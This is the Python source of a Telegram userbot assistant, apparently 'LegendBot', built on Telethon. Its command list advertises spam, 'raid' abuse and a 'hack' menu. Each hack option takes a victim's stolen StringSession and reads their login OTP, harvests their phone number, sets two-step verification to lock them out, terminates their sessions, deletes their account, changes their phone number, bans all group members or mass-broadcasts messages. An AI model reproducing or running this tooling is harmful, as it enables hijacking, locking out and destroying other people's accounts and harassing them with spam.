import asyncio
import os
import re
from os import system

from telethon import Button, events

api_id = os.environ.get("APP_ID")
api_hash = os.environ.get("API_HASH")

from Legendbot import *

from . import *
from .helpers.hack import *

mybot = "missrose_bot"

legendboy = 2024465080


from telethon import Button, custom, events

from .core.logger import logging
from .core.session import legend, tgbot

LOGS = logging.getLogger("LegendUserBot")
LEGEND_PIC = "https://te.legra.ph/file/d3785d49b2c5e6f00bc67.jpg"

onbot = "start - Check if I am Alive \nhelp - Check ALL Command\nalive- To Check alive status\nping - To check ping of bot\nuinfo - To Check info of assistant chat\nbroadcast - broadcast message to all the person who has started ur bot\nban - to ban person to block message in assistant chat\nunban - To Unban Person allw to message in assistant chat\neval - To run python code\npurge - To Purge Message from replied\ndel - To del replied message\nbigspam - To Spam Through Bot value > 100\ndelayspam - Spam With Delay \nraid - To Abuse Anyone By username/name/reply\nreplyraid - To Activate Raid On Anyone\ndreplyraid - To Stop Raid\nspam - To Spam With Chat value < 100\nhack - Hack Telegram account through StringSession"
perf = "[ †hê Lêɠêɳ̃dẞø† ]"

bot = legend


async def killer():
    LEGEND_USER = bot.me.first_name
    The_LegendBoy = bot.uid
    legd_mention = f"[{LEGEND_USER}](tg://user?id={The_LegendBoy})"
    name = f"{legd_mention}'s Assistant"
    description = f"I am Assistant Of {legd_mention}.This Bot Can Help U To Chat With My Master  @LegendBot_XD"
    starkbot = await legend.tgbot.get_me()
    bot_name = starkbot.first_name
    botname = f"@{starkbot.username}"
    if bot_name.endswith("Assistant"):
        print("Bot Starting")
    else:
        try:
            await bot.send_message("@BotFather", "/setinline")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", perf)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setcommands")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", onbot)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setname")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", name)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setdescription")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", description)
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", "/setuserpic")
            await asyncio.sleep(1)
            await bot.send_message("@BotFather", botname)
            await asyncio.sleep(1)
            await bot.send_file(
                "@BotFather", "Legendbot/helpers/resources/pics/main.jpg"
            )
            await asyncio.sleep(2)
        except Exception as e:
            print(e)


@legend.tgbot.on(events.NewMessage(pattern="/start", func=lambda x: x.is_group))
async def stat(event):
    keybard = [(Button.inline("⭐ Click Here ⭐", data="start"))]
    await tgbot.send_message(event.chat_id, f"Click Below To Start", buttons=keybard)


@legend.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"start")))
async def help(event):
    starkbot = await tgbot.get_me()
    bot_id = starkbot.first_name
    if event.query.user_id is not bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message=f"Hey, I am your {bot_id}'s assistant bot.\nI Am Here To Help U \n\nPowered By [LegendBot](https://t.me/LegendBot_OP)",
            buttons=[
                [
                    Button.url(" Support ", "https://t.me/LegendBot_OP"),
                    Button.url(" Updates ", "https://t.me/LegendBot_AI"),
                ],
                [
                    custom.Button.inline(" Users ", data="users"),
                    custom.Button.inline(" Settings ", data="osg"),
                ],
                [custom.Button.inline(" Hack ", data="hack")],
            ],
        )
    else:
        await event.answer("Sorry U Cant Acces This Button", cache_time=0, alert=True)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"osg")))
async def help(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message="Which Type Of Setting Do U Want Sir",
            buttons=[
                [
                    custom.Button.inline(" Restart ", data="res_tart"),
                    custom.Button.inline(" Shut Down ", data="shutdown"),
                ],
                [
                    custom.Button.inline(" Set Var", data="strvar"),
                ],
                [custom.Button.inline(" Back ", data="start")],
            ],
        )
    else:
        await event.answer(
            "Sorry Only My Master Can Access This Button", cache_time=0, alert=True
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"shutdown")))
async def rel(event):
    if event.query.user_id == bot.uid:
        await event.answer("ShutDown Lêɠêɳ̃dẞø†...", cache_time=0, alert=True)
        if BOTLOG:
            await event.client.send_message(
                BOTLOG_CHATID, "#SHUTDOWN \n" "Bot shut down"
            )
        if HEROKU_APP is not None:
            HEROKU_APP.process_formation()["worker"].scale(0)
        else:
            os._exit(143)
    else:
        await event.answer(
            "Sorry U Dont Have Access to Use this Button", cache_time=0, alert=True
        )


@legend.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"res_tart")))
async def res_ttart(event):
    if event.query.user_id == bot.uid:
        await event.answer("Restarting Please Wait 4 min... ", cache_time=0, alert=True)
        if BOTLOG:
            LEGEND = await event.client.send_message(
                BOTLOG_CHATID, "# RESTART \n" "Bot Restarted"
            )
        try:
            await legend.disconnect()
        except CancelledError:
            pass
        except Exception as e:
            LOGS.error(e)
    else:
        await event.answer(
            "Sorry Only My Master Can Access It", cache_time=0, alert=True
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"strvar")))
async def help(event):
    if event.query.user_id == bot.uid:
        await event.delete()
        await tgbot.send_message(
            event.chat_id,
            message="Which Type Of Setting Do U Want Sir",
            buttons=[
                [
                    custom.Button.inline(" Set var ", data="setvar"),
                    custom.Button.inline(" Get Var ", data="gevar"),
                ],
                [custom.Button.inline(" Del Var ", data="delvar")],
            ],
        )
    else:
        await event.answer("Sorry This Button Only My Master", cache_time=0, alert=True)


@legend.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"setvar")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        if (Config.API_KEY is None) or (Config.APP_NAME is None):
            return await x.send_message(
                "Set the required vars in heroku to function this normally `API_KEY` and `APP_NAME`.",
            )
        await x.send_message("👨‍💻 GIVE VAR NAME")
        variable = await x.get_response()
        await x.send_message("👨‍💻 GIVE VALUE")
        value = await x.get_response()
        await setvar(variable.text, value.text)
        await event.reply("Done Now Wait For A Minute To Complete Logs")


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"getvar")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        if (Config.API_KEY is None) or (Config.APP_NAME is None):
            return await x.send_message(
                "Set the required vars in heroku to function this normally `API_KEY` and `APP_NAME`.",
            )
        await x.send_message("👨‍💻 GIVE VAR NAME")
        variable = await x.get_response()
        lol = await getvar(variable.text)
        await event.reply(f"{lol}")


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"delvar")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        if (Config.API_KEY is None) or (Config.APP_NAME is None):
            return await x.send_message(
                "Set the required vars in heroku to function this normally `API_KEY` and `APP_NAME`.",
            )
        await x.send_message("👨‍💻 GIVE VAR NAME")
        variable = await x.get_response()
        lol = await delvar(variable.text)
        await event.reply(f"Done Now Wait For A Minute To Complete Logs \n\n {lol}")


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"close")))
async def help(event):
    await event.delete()


menu = """
Reply To My Message If I am using In Group

"A" :~ [Check user own groups and channels]

"B" :~ [Check user all information like phone number, usrname... etc]

"C" :~ [Ban a group {give me StringSession and channel/group username i will ban all members there}]

"D" :~ [Know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]

"E" :~ [Join A Group/Channel via StringSession]

"F" :~ [Leave A Group/Channel via StringSession]

"G" :~ [Delete A Group/Channel]

"H" :~ [Check user two step is eneable or disable]

"I" :~ [Terminate All current active sessions except Your StringSession]

"J" :~ [Delete Account]

"K" :~ [Demote all admins in a group/channel]

"L" ~ [Promote a member in a group/channel]

"M" ~ [Change Phone number using StringSession]

I will add more features Later 😅
"""

keyboard = [
    [
        Button.inline("A", data="Ahack"),
        Button.inline("B", data="Bhack"),
        Button.inline("C", data="Chack"),
        Button.inline("D", data="Dhack"),
        Button.inline("E", data="Ehack"),
    ],
    [
        Button.inline("F", data="Fhack"),
        Button.inline("G", data="Ghack"),
        Button.inline("H", data="Hhack"),
        Button.inline("I", data="Ihack"),
        Button.inline("J", data="Jhack"),
    ],
    [
        Button.inline("K", data="Khack"),
        Button.inline("L", data="Lhack"),
        Button.inline("M", data="Mhack"),
        Button.inline("N", data="Nhack"),
        Button.inline("O", data="Ohack"),
    ],
    [Button.inline("Back", data="osg")],
]


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"hack")))
async def start(event):
    global menu
    if event.query.user_id == bot.uid:
        await event.delete()
        async with tgbot.conversation(event.chat_id) as x:
            await x.send_message(
                f"Choose what you want with string session \n\n{menu}", buttons=keyboard
            )
    else:
        await event.answer(
            "U Dont Have Right To Access This Hack Button", cache_time=0, alert=True
        )


@legend.tgbot.on(
    events.NewMessage(pattern="/hack", func=lambda x: x.sender_id == bot.uid)
)
async def start(event):
    global menu
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message(
            f"Choose what you want with string session \n\n{menu}", buttons=keyboard
        )


@legend.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ahack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("📍GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.\n /hack", buttons=keyboard
            )
        try:
            i = await userchannels(strses.text)
        except:
            return await event.reply(
                "This StringSession Has Been Terminated.\n/hack", buttons=keyboard
            )
        if len(i) > 3855:
            file = open("session.txt", "w")
            file.write(i + "\n\nDetails BY LegendBoy")
            file.close()
            await bot.send_file(event.chat_id, "session.txt")
            system("rm -rf session.txt")
        else:
            await event.reply(
                i + "\n\nThanks For using LegendBoyBot. \n/hack", buttons=keyboard
            )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Bhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("🔰GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.\n/hack", buttons=keyboard
            )
        i = await userinfo(strses.text)
        await event.reply(
            i + "\n\nThanks For using LegendBoy Bot.\n/hack", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Chack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "String Session Has Been Terminated", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await userbans(strses.text, grpid.text)
        await event.reply(
            "Banning all members. Thanks For using LegendBoy Bot", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Dhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        i = await usermsgs(strses.text)
        await event.reply(i + "\n\nThanks For using LegendBoy Bot", buttons=keyboard)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ehack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await joingroup(strses.text, grpid.text)
        await event.reply(
            "Joined the Channel/Group Thanks For using LegendBoy Bot", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Fhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await leavegroup(strses.text, grpid.text)
        await event.reply(
            "Leaved the Channel/Group Thanks For using Boy Bot,", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ghack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await delgroup(strses.text, grpid.text)
        await event.reply(
            "Deleted the Channel/Group Thanks For using LegendBoyBot.", buttons=keyboard
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Hhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession is terminated maybe.", buttons=keyboard
            )
        i = await user2fa(strses.text)
        if i:
            await event.reply(
                "User don't have two step thats why now two step is `LegendBoy Bot Is best` you can login now\n\nThanks For using LegendBoy Bot.",
                buttons=keyboard,
            )
        else:
            await event.reply("Sorry User Have two step already", buttons=keyboard)


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ihack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await terminate(strses.text)
        await event.reply(
            "The all sessions are terminated\n\nThanks For using LegendBoyBot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Jhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await delacc(strses.text)
        await event.reply(
            "The Account is deleted SUCCESSFULLLY\n\nThanks For using LegendBoy Bot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Khack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
        grp = await x.get_response()
        await x.send_message("NOW GIVE USER USERNAME")
        user = await x.get_response()
        await promote(strses.text, grp.text, user.text)
        await event.reply(
            "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using LegendBoy Bot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Lhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
        pro = await x.get_response()
        try:
            await demall(strses.text, pro.text)
        except:
            pass
        await event.reply(
            "I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using LegendBoyBot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Mhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession is terminated maybe", buttons=keyboard
            )
        await x.send_message(
            "GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] "
        )
        number = (await x.get_response()).text
        try:
            result = await change_number(strses.text, number)
            await event.respond(
                result
                + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp"
            )
            await asyncio.sleep(20)
            await x.send_message("NOW GIVE PHONE CODE HASH")
            phone_code_hash = (await x.get_response()).text
            await x.send_message("NOW GIVE THE OTP")
            otp = (await x.get_response()).text
            changing = await change_number_code(
                strses.text, number, phone_code_hash, otp
            )
            if changing:
                await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
            else:
                await event.respond("Something is wrong")
        except Exception as e:
            await event.respond(
                "SEND THIS ERROR TO - @Legend_Userbot\n**LOGS**\n" + str(e)
            )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ohack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("NOW GIVE USER USERNAME")
        user = await x.get_response()
        await gpromote(strses.text, user.text)
        await event.reply(
            "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using LegendBoy Bot.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Nhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "This StringSession Has Been Terminated.", buttons=keyboard
            )
        await x.send_message("Now Give Message")
        msg = await x.get_response()
        await gcast(strses.text, msg.text)
        await event.reply(
            "Done 😗😗\n\nThanks For Using LegendBoy Bot.",
            buttons=keyboard,
        )
